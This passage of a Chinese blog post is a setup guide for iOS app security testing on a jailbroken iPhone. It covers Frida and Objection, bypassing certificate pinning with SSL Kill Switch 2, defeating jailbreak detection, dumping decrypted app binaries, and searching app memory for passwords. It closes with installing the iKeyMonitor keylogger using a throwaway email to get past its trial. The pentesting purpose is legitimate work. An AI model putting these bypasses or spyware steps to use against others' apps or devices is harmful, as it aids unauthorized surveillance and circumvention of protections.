-<p>需要在iPhone上执行的操作：打开Cydia -&gt; 点击底部栏“软件源” -&gt; 点击右上角“编辑” -&gt; 点击左上角“添加”，然后输入 <a href="https://build.frida.re" target="_blank" rel="noopener">https://build.frida.re</a></p>
-<p>完成之后，点击新增的源找到“build.frida.re”点击进去，里面有三个可选项，分别是“Frida for 32-bit devices”、“Frida for A12+ devices”、“Frida for pre-A12 devices”，32-bit是iPhone 5s和iPad Air（不含）以下的设备，A12+是iPhone X（不含）以上的设备。</p>
-<p>因为我的设备是iPhone SE，芯片型号是A9，所以选择“Frida for pre-A12 devices”</p>
-<p>安装完Firda之后，继续安装Objection。</p>
-<p>在Mac上执行<code>pip3 install objection</code>，安装完成之后可以运行<code>objection --gadget &quot;com.apple.AppStore&quot; explore</code>来测试一下</p>
-<img src="/2020/03/31/iOS-jailbreak/objection-install.png" alt="objection-install" style="zoom:50%;">
-
-
-
-<p>⚠️ 如果安装的是“Frida for A12+ devices”，使用Frida时需要开启Xcode来挂载硬盘镜像。</p>
-<img src="/2020/03/31/iOS-jailbreak/objection-error.png" alt="objection-error" style="zoom:50%;">
-
-
-
-<h1 id="证书配置和安装SSL-Kill-Switch-2"><a href="#证书配置和安装SSL-Kill-Switch-2" class="headerlink" title="证书配置和安装SSL Kill Switch 2"></a>证书配置和安装SSL Kill Switch 2</h1><p>证书配置非常简单，设置好burp代理，访问 <a href="http://burp" target="_blank" rel="noopener">http://burp</a> ，安装证书。</p>
-<p>安装证书之后在 设置 -&gt; 通用 -&gt; 描述文件 -&gt; PortSwigger CA，点击安装。</p>
-<p>再到 通用 -&gt; 关于本机 -&gt; 证书信任设置，选上PortSwigger即可。</p>
-<img src="/2020/03/31/iOS-jailbreak/certificate-trust.png" alt="certificate-trust" style="zoom:33%;">
-
-
-
-<p>重点是安装SSL Killing，app测试时很多应用都会强制使用certificate pinning导致无法抓包，安装<a href="https://github.com/nabla-c0d3/ssl-kill-switch2" target="_blank" rel="noopener">SSL Kill Switch 2</a>可帮助我们绕过certificate pinning。</p>
-<ol>
-<li>安装前先确定Cydia中安装了以下packages：<code>wget</code>、<code>Debian Packager</code>、<code>Cydia Substrate</code>、<code>PreferenceLoader</code></li>
-</ol>
-<p>⚠️ 找不到PreferenceLoader，可添加源：<a href="https://rpetri.ch/repo" target="_blank" rel="noopener">https://rpetri.ch/repo</a> ，再安装。</p>
-<ol start="2">
-<li>在<a href="https://github.com/nabla-c0d3/ssl-kill-switch2/releases" target="_blank" rel="noopener">SSL Kill Switch 2 release</a>中复制最新的<code>.deb</code>链接</li>
-<li>使用SSH连接iPhone，运行<code>wget &lt;RELEASE URL FROM STEP 2&gt;</code> -&gt; <code>dpkg -i &lt;DOWNLOAD PACKAGE NAME&gt;</code> -&gt;killall -HUP SpringBoard，确定安装成功后<code>rm &lt;DOWNLOAD PACKAGE NAME&gt;</code></li>
-<li>打开iPhone，在设置 -&gt; SSL Kill Switch 2（设置的最下方） -&gt; 勾选Disable Certificate Validation</li>
-</ol>
-<img src="/2020/03/31/iOS-jailbreak/SSL-Kill-Switch.png" alt="SSL-Kill-Switch" style="zoom:33%;">
-
-
-
-<h1 id="绕过越狱检测"><a href="#绕过越狱检测" class="headerlink" title="绕过越狱检测"></a>绕过越狱检测</h1><h3 id="Liberty"><a href="#Liberty" class="headerlink" title="Liberty"></a>Liberty</h3><p>iPhone上打开Cydia，添加源<code>https://ryleyangus.com/repo/</code>，之后搜索<code>Liberty Lite</code>，安装即可。</p>
-<p>安装完成之后在设置中开启Liberty，再点击Block Jailbreak Detection中选择需要绕过越狱检测的iOS应用。</p>
-<img src="/2020/03/31/iOS-jailbreak/liberty.png" alt="liberty" style="zoom:33%;">
-
-<p>如果在某些APP中不生效，也可以尝试其他插件，比如xCon。</p>
-<h3 id="xCon"><a href="#xCon" class="headerlink" title="xCon"></a>xCon</h3><p>在Cydia中添加源 <a href="http://xcon.crazy.net/" target="_blank" rel="noopener">http://xcon.crazy.net</a> ，进入添加的源中选择xCon下载安装即可。</p>
-<p>xCon会绕过以下越狱检测方法（1）根据是否存在特定的越狱文件，及特定文件的权限是否发生变化来判断设备是否越狱（2）根据沙箱完整性检测设备是否越狱（3）根据文件系统的分区是否发生变化来检测设备是否越狱（4）根据是否安装ssh来判断设备是否越狱</p>
-<h1 id="导出APP文件"><a href="#导出APP文件" class="headerlink" title="导出APP文件"></a>导出APP文件</h1><p>导出APP是一个非常有用的功能，导出之后的文件没有壳，拖到IDA中直接反编译就行，非常方便，谁用谁知道。</p>
-<ol>
-<li>在Mac中输入<code>git clone https://github.com/AloneMonkey/frida-ios-dump.git &amp;&amp; cd frida-ios-dump</code></li>
-<li><code>sudo pip3 install -r requirements.txt --upgrade</code></li>
-<li>在另一个终端输入<code>iproxy 2222 22</code></li>
-<li><code>python3 dump.py -l</code>列举iPhone上所有的应用，<code>python3 ./dump.py &lt;APP DISPLAY NAME OR BUNDLE IDENTIFIER&gt;</code>导出APP文件。</li>
-</ol>
-<h1 id="安装Apple-File-Conduit-2"><a href="#安装Apple-File-Conduit-2" class="headerlink" title="安装Apple File Conduit 2"></a>安装Apple File Conduit 2</h1><p>iOS9以上无法通过第三方软件读取应用文件，安装Apple File Confuit2可绕过该限制。</p>
-<p>在Cydia中搜索“Apple File Confuit2”即可</p>
-<p>APP文件目录：    </p>
-<p>a) iOS7及之前：/Device/private/var/mobile/Application/UUID/XXXXX.app/</p>
-<p>b) iOS8：/var/mobile/Containers/Bundle/Application/UUID/</p>
-<p>c) iOS9/10/12：/var/containers/Bundle/Application/UUID/</p>
-<h1 id="添加mem-check"><a href="#添加mem-check" class="headerlink" title="添加mem-check"></a>添加mem-check</h1><p>已经安装好OpenSSH，可以使用sftp将mem-check文件上传到iPhone中。</p>
-<p>在本机输入<code>sftp -P 2222 root@localhost</code>，再输入密码<code>alpine</code>进入sftp模式</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">~ sftp -P 2222 root@localhost</span><br><span class="line">root@localhost<span class="string">'s password: alpine</span></span><br><span class="line"><span class="string">Connected to localhost.</span></span><br></pre></td></tr></table></figure>
-
-<p>进入sftp模式后，使用put将文件上传至iPhone中，上传文件路径为本机的路径</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sftp&gt; put /Tmp/mem-check</span><br><span class="line">Uploading /Tmp/mem-check to /private/var/root/mem-check</span><br><span class="line">/Tmp/mem-check                                       100%  132KB   8.2MB/s   00:00</span><br><span class="line">sftp&gt;</span><br></pre></td></tr></table></figure>
-
-<p>然后给mem-check加上执行权限，</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chmod +x mem-check</span><br></pre></td></tr></table></figure>
-
-<p>先用ps命令得到APP的PID，再利用mem-check –p PID –s STRING对APP内存进行搜索</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">~ root<span class="comment"># ps A | grep XXX</span></span><br><span class="line">~ root<span class="comment"># mem-check -p 1234 -s password</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="iKeyMonitor安装"><a href="#iKeyMonitor安装" class="headerlink" title="iKeyMonitor安装"></a>iKeyMonitor安装</h1><p>iKeyMonitor安装直接在Cydia中搜索iKeyMonitor即可</p>
-<p>iKeymonitor只有三天试用时间，使用十分钟邮箱（<a href="http://mail.bccto.me/" target="_blank" rel="noopener">http://mail.bccto.me/</a> ）获取一个随机的邮箱，然后在官网进行注册（ <a href="https://ikeymonitor.com/" target="_blank" rel="noopener">https://ikeymonitor.com/</a> ）</p>
-<p>官网选择sign up -&gt; iPhone/iPad -&gt; The iPhone/iPad can be Jailbroken, and I can get it in my hand and jailbreak it -&gt; 填写User ID 和 Email</p>
-<p>然后会收到一封邮件，点击查看可得到许可证号，使用许可证登录即可</p>
-<p><img src="/2020/03/31/iOS-jailbreak/iKeyMonitor.png" alt="iKeyMonitor"></p>
-<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><p><a href="https://spaceraccoon.dev/from-checkra1n-to-frida-ios-app-pentesting-quickstart-on-ios-13" target="_blank" rel="noopener">https://spaceraccoon.dev/from-checkra1n-to-frida-ios-app-pentesting-quickstart-on-ios-13</a></p>
-<p><a href="https://frida.re/docs/ios/" target="_blank" rel="noopener">https://frida.re/docs/ios/</a></p>
-<p><a href="https://github.com/sensepost/objection/wiki/Screenshots" target="_blank" rel="noopener">https://github.com/sensepost/objection/wiki/Screenshots</a></p>
 ]]></content>
   </entry>
 </search>
